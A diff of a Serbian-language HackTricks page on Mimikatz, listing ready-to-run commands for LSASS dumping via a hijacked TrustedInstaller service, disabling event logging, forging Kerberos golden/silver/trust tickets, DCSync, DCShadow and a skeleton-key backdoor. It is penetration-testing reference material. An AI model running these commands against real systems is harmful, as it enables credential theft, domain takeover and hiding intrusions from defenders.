@@ -1,210 +1,216 @@
 # Mimikatz
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-**Ova stranica je bazirana na jednoj sa [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Proverite original za dodatne informacije!
+**Ova stranica se zasniva na jednoj sa [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Proverite original za dodatne informacije!
 
-## LM i čisti tekst u memoriji
+## LM i Plain-Text u memoriji
 
-Od Windows 8.1 i Windows Server 2012 R2 verzija, značajne mere su preduzete kako bi se zaštitili od krađe akreditacija:
+Od Windows 8.1 i Windows Server 2012 R2 nadalje, značajne mere su implementirane za zaštitu od krađe kredencijala:
 
-- **LM heševi i lozinke u čistom tekstu** više nisu smešteni u memoriji radi poboljšane sigurnosti. Specifično podešavanje registra, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, mora biti konfigurisano sa DWORD vrednošću `0` kako bi se onemogućila Digest autentifikacija, čime se osigurava da "čisti tekst" lozinke nisu keširane u LSASS-u.
+- **LM hešovi i plain-text lozinke** više se ne čuvaju u memoriji radi poboljšanja bezbednosti. Specifična registri postavka, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ mora biti konfigurisana sa DWORD vrednošću `0` da bi se onemogućila Digest Authentication, osiguravajući da "plain-text" lozinke nisu keširane u LSASS.
 
-- **LSA zaštita** je uvedena kako bi se zaštitio proces Local Security Authority (LSA) od neovlašćenog čitanja memorije i ubacivanja koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA zaštite uključuje:
-1. Izmenu registra na putanji _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
-2. Implementaciju Group Policy Object (GPO) koji primenjuje ovo promene registra na upravljanim uređajima.
+- **LSA zaštita** je uvedena da zaštiti proces Lokalnog sigurnosnog autoriteta (LSA) od neovlašćenog čitanja memorije i injekcije koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA zaštite uključuje:
+1. Modifikovanje registra na _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
+2. Implementaciju objekta grupne politike (GPO) koji sprovodi ovu promenu registra na upravljanim uređajima.
 
-Uprkos ovim zaštitama, alati poput Mimikatz-a mogu zaobići LSA zaštitu koristeći određene drajvere, iako će takve radnje verovatno biti zabeležene u evidenciji događaja.
+Uprkos ovim zaštitama, alati poput Mimikatz mogu zaobići LSA zaštitu koristeći specifične drajvere, iako su takve radnje verovatno zabeležene u dnevnicima događaja.
 
-### Protivljenje uklanjanju SeDebugPrivilege
+### Suprotstavljanje uklanjanju SeDebugPrivilege
 
-Administratori obično imaju SeDebugPrivilege privilegiju, koja im omogućava da debaguju programe. Ova privilegija može biti ograničena kako bi se sprečilo neovlašćeno izvlačenje memorije, uobičajena tehnika koju napadači koriste za izvlačenje akreditacija iz memorije. Međutim, čak i sa uklonjenom ovom privilegijom, TrustedInstaller nalog i dalje može vršiti izvlačenje memorije koristeći prilagođenu konfiguraciju servisa:
+Administratori obično imaju SeDebugPrivilege, što im omogućava da debaguju programe. Ova privilegija može biti ograničena da se spreče neovlašćeni dumpovi memorije, što je uobičajena tehnika koju napadači koriste za vađenje kredencijala iz memorije. Međutim, čak i sa ovom privilegijom uklonjenom, TrustedInstaller nalog može i dalje vršiti dumpove memorije koristeći prilagođenu konfiguraciju servisa:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Ovo omogućava preuzimanje memorije `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu kako bi se izvukli podaci za prijavu:
+Ovo omogućava iskopavanje memorije `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu kako bi se izvukle kredencijale:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-## Opcije Mimikatz-a
+## Mimikatz Opcije
 
-Manipulacija događajnim zapisima u Mimikatz-u uključuje dve osnovne radnje: brisanje događajnih zapisa i zakrpu Event servisa kako bi se sprečilo beleženje novih događaja. U nastavku su navedene komande za izvođenje ovih radnji:
+Manipulacija dnevnikom događaja u Mimikatz-u uključuje dve osnovne radnje: brisanje dnevnika događaja i patch-ovanje Event servisa kako bi se sprečilo beleženje novih događaja. Ispod su komande za izvođenje ovih radnji:
 
-#### Brisanje događajnih zapisa
+#### Brisanje Dnevnika Događaja
 
-- **Komanda**: Ova radnja ima za cilj brisanje događajnih zapisa, čime se otežava praćenje zlonamernih aktivnosti.
-- Mimikatz ne pruža direktnu komandu u svojoj standardnoj dokumentaciji za brisanje događajnih zapisa direktno putem komandne linije. Međutim, manipulacija događajnim zapisima obično uključuje korišćenje sistemskih alata ili skripti van Mimikatz-a za brisanje određenih zapisa (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).
+- **Komanda**: Ova radnja je usmerena na brisanje dnevnika događaja, čineći teže praćenje zlonamernih aktivnosti.
+- Mimikatz ne pruža direktnu komandu u svojoj standardnoj dokumentaciji za brisanje dnevnika događaja direktno putem komandne linije. Međutim, manipulacija dnevnikom događaja obično uključuje korišćenje sistemskih alata ili skripti van Mimikatz-a za brisanje specifičnih dnevnika (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).
 
-#### Eksperimentalna funkcionalnost: Zakrpa Event servisa
+#### Eksperimentalna Funkcija: Patch-ovanje Event Servisa
 
 - **Komanda**: `event::drop`
-- Ova eksperimentalna komanda je namenjena izmeni ponašanja Event Logging servisa, čime se efektivno sprečava beleženje novih događaja.
+- Ova eksperimentalna komanda je dizajnirana da modifikuje ponašanje Event Logging Servisa, efikasno sprečavajući ga da beleži nove događaje.
 - Primer: `mimikatz "privilege::debug" "event::drop" exit`
 
-- Komanda `privilege::debug` obezbeđuje da Mimikatz radi sa neophodnim privilegijama za izmenu sistemskih servisa.
-- Komanda `event::drop` zatim zakrpljuje Event Logging servis.
+- Komanda `privilege::debug` osigurava da Mimikatz radi sa potrebnim privilegijama za modifikaciju sistemskih servisa.
+- Komanda `event::drop` zatim patch-uje Event Logging servis.
 
 
-### Napadi na Kerberos tikete
+### Kerberos Napadi na Tikete
 
 ### Kreiranje Zlatnog Tiketa
 
-Zlatni Tiket omogućava impersonaciju pristupa na nivou domena. Ključna komanda i parametri:
+Zlatni tiket omogućava pristup na nivou domena putem impersonacije. Ključna komanda i parametri:
 
 - Komanda: `kerberos::golden`
 - Parametri:
 - `/domain`: Ime domena.
 - `/sid`: Sigurnosni identifikator (SID) domena.
 - `/user`: Korisničko ime za impersonaciju.
-- `/krbtgt`: NTLM heš servisnog naloga KDC-a domena.
-- `/ptt`: Direktno ubacuje tiket u memoriju.
+- `/krbtgt`: NTLM hash naloga KDC servisa domena.
+- `/ptt`: Direktno injektuje tiket u memoriju.
 - `/ticket`: Čuva tiket za kasniju upotrebu.
 
 Primer:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Kreiranje Silver Tiketa
+### Silver Ticket Creation
 
-Silver Tiketi omogućavaju pristup određenim uslugama. Ključna komanda i parametri:
+Silver Tickets omogućavaju pristup specifičnim uslugama. Ključna komanda i parametri:
 
-- Komanda: Slično kao i za Golden Tiket, ali cilja određene usluge.
+- Komanda: Slična Golden Ticket, ali cilja specifične usluge.
 - Parametri:
-- `/service`: Usluga koja se cilja (npr. cifs, http).
-- Ostali parametri su slični kao za Golden Tiket.
+- `/service`: Usluga koja se cilja (npr., cifs, http).
+- Ostali parametri slični Golden Ticket.
 
 Primer:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Kreiranje Trust Tiketa
+### Trust Ticket Creation
 
-Trust Tiketi se koriste za pristup resursima između domena putem poverenja između njih. Ključna komanda i parametri:
+Trust Tickets se koriste za pristup resursima širom domena koristeći odnose poverenja. Ključna komanda i parametri:
 
-- Komanda: Slično kao i Golden Ticket, ali za poverene odnose.
+- Komanda: Slična Zlatnoj Kartici, ali za odnose poverenja.
 - Parametri:
 - `/target`: FQDN ciljnog domena.
-- `/rc4`: NTLM heš za nalog poverenja.
+- `/rc4`: NTLM hash za račun poverenja.
 
 Primer:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### Dodatne Kerberos komande
+### Dodatne Kerberos Komande
 
-- **Izlistavanje karata**:
+- **Listing Tickets**:
 - Komanda: `kerberos::list`
-- Izlistava sve Kerberos karte za trenutnu korisničku sesiju.
+- Prikazuje sve Kerberos karte za trenutnu korisničku sesiju.
 
-- **Prosljeđivanje keša**:
+- **Pass the Cache**:
 - Komanda: `kerberos::ptc`
-- Ubacuje Kerberos karte iz keš fajlova.
+- Umeće Kerberos karte iz fajlova keša.
 - Primer: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Prosljeđivanje karte**:
+- **Pass the Ticket**:
 - Komanda: `kerberos::ptt`
 - Omogućava korišćenje Kerberos karte u drugoj sesiji.
 - Primer: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Brisanje karata**:
+- **Purge Tickets**:
 - Komanda: `kerberos::purge`
 - Briše sve Kerberos karte iz sesije.
 - Korisno pre korišćenja komandi za manipulaciju kartama kako bi se izbegli konflikti.
 
 
-### Manipulacija Active Directory-jem
+### Manipulacija Aktivnim Direktorijumom
 
 - **DCShadow**: Privremeno čini mašinu da se ponaša kao DC za manipulaciju AD objektima.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Oponaša DC da bi zatražio podatke o lozinkama.
+- **DCSync**: Oponaša DC da zatraži podatke o lozinkama.
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Pribavljanje akreditiva
+### Pristup Akreditivima
 
-- **LSADUMP::LSA**: Izvlači akreditive iz LSA.
+- **LSADUMP::LSA**: Ekstrahuje akreditive iz LSA.
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinkama računa računara.
-- *Nije pružena posebna komanda za NetSync u originalnom kontekstu.*
+- *Nema specifične komande za NetSync u originalnom kontekstu.*
 
 - **LSADUMP::SAM**: Pristup lokalnoj SAM bazi podataka.
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Dekriptuje tajne koje su smeštene u registru.
+- **LSADUMP::Secrets**: Dekriptuje tajne smeštene u registru.
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Postavlja novi NTLM heš za korisnika.
+- **LSADUMP::SetNTLM**: Postavlja novu NTLM heš vrednost za korisnika.
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Pribavlja informacije o autentifikaciji poverenja.
+- **LSADUMP::Trust**: Preuzima informacije o poverenju.
 - `mimikatz "lsadump::trust" exit`
 
 ### Razno
 
-- **MISC::Skeleton**: Ubacuje zadnja vrata u LSASS na DC-u.
+- **MISC::Skeleton**: Umeće backdoor u LSASS na DC-u.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-### Eskalacija privilegija
+### Eskalacija Privilegija
 
-- **PRIVILEGE::Backup**: Pribavlja prava za pravljenje rezervnih kopija.
+- **PRIVILEGE::Backup**: Stiče prava za pravljenje rezervnih kopija.
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Pribavlja privilegije za debagovanje.
+- **PRIVILEGE::Debug**: Dobija privilegije za debagovanje.
 - `mimikatz "privilege::debug" exit`
 
-### Pribavljanje akreditiva
+### Dumpovanje Akreditiva
 
 - **SEKURLSA::LogonPasswords**: Prikazuje akreditive za prijavljene korisnike.
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Izvlači Kerberos karte iz memorije.
+- **SEKURLSA::Tickets**: Ekstrahuje Kerberos karte iz memorije.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Manipulacija SID-om i tokenom
+### Manipulacija Sid-om i Tokenima
 
 - **SID::add/modify**: Menja SID i SIDHistory.
 - Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Modifikuj: *Nije pružena posebna komanda za modifikaciju u originalnom kontekstu.*
+- Izmeni: *Nema specifične komande za izmenu u originalnom kontekstu.*
 
 - **TOKEN::Elevate**: Oponaša tokene.
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminalne usluge
+### Terminalne Usluge
 
-- **TS::MultiRDP**: Dozvoljava više RDP sesija.
+- **TS::MultiRDP**: Omogućava više RDP sesija.
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: Izlistava TS/RDP sesije.
-- *Nije pružena posebna komanda za TS::Sessions u originalnom kontekstu.*
+- **TS::Sessions**: Prikazuje TS/RDP sesije.
+- *Nema specifične komande za TS::Sessions u originalnom kontekstu.*
 
 ### Trezor
 
-- Izvlači lozinke iz Windows trezora.
+- Ekstrahuje lozinke iz Windows Trezora.
 - `mimikatz "vault::cred /patch" exit`
 
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repo-u**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo-u**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
